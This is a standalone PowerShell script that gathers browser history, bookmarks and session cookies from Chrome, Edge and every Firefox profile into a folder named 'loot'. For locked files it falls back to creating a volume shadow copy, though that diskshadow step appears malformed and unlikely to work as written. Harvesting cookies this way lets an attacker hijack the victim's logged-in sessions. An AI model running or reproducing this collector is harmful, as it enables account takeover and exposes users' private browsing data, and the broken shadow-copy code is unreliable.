$loot = "C:\Users\Public\browser_artifacts"
New-Item -ItemType Directory -Force -Path $loot | Out-Null

# Helper for safe copy of locked files
function Copy-Safe {
    param($source, $dest)
    try {
        Copy-Item $source $dest -ErrorAction Stop
    } catch {
        # Copy shadow copy fallback (safe technique)
        $shadow = "C:\shadow_tmp"
        diskshadow /s { 
            SET CONTEXT PERSISTENT
            BEGIN BACKUP
            ADD VOLUME C: ALIAS vol1
            CREATE
            END BACKUP
        } | Out-Null

        $shadowPath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"
        $fullPath = $source.Replace("C:", $shadowPath)
        Copy-Item $fullPath $dest -Force
    }
}

# Chrome (User Data)
$chromePaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
)

$chromeDest = "$loot\Chrome"
New-Item -ItemType Directory -Force -Path $chromeDest | Out-Null

foreach ($path in $chromePaths) {
    if (Test-Path $path) {
        Copy-Safe $path $chromeDest
    }
}

# Edge
$edgePaths = @(
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Bookmarks"
)

$edgeDest = "$loot\Edge"
New-Item -ItemType Directory -Force -Path $edgeDest | Out-Null

foreach ($path in $edgePaths) {
    if (Test-Path $path) {
        Copy-Safe $path $edgeDest
    }
}

# Firefox (Profiles)
$ffBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
$ffDest = "$loot\Firefox"

if (Test-Path $ffBase) {
    New-Item -ItemType Directory -Force -Path $ffDest | Out-Null

    foreach ($profile in Get-ChildItem $ffBase) {
        $pDest = "$ffDest\$($profile.Name)"
        New-Item -ItemType Directory -Force -Path $pDest | Out-Null

        Copy-Safe "$($profile.FullName)\places.sqlite" $pDest
        Copy-Safe "$($profile.FullName)\cookies.sqlite" $pDest
    }
}

Write-Output "Browser artifact collection complete."
